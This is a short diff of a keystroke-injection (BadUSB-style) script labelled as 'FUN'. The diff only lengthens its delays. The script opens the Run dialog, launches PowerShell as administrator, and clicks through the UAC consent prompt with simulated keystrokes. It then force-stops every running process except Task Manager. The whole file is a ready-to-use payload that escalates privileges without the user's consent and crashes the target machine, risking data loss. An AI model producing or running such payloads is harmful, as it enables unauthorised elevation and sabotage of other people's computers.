@@ -2,16 +2,16 @@ REM Author: UNC0V3R3D
 REM Description: Uses the taskmanager and tries to end all processes
 REM Version: 1.0
 REM Category: FUN
-DELAY 800
+DELAY 2000
 GUI r
-DELAY 800
+DELAY 2000
 STRING powershell Start-Process powershell -Verb runAs
-DELAY 800
+DELAY 2000
 ENTER
-DELAY 800
+DELAY 2000
 LEFTARROW
-DELAY 800
+DELAY 2000
 ENTER
-DELAY 500
+DELAY 2000
 STRING Start-Process taskmgr.exe -WindowStyle Hidden; Get-Process | Where-Object { $_.Name -ne "taskmgr" } | Stop-Process -Force
 ENTER
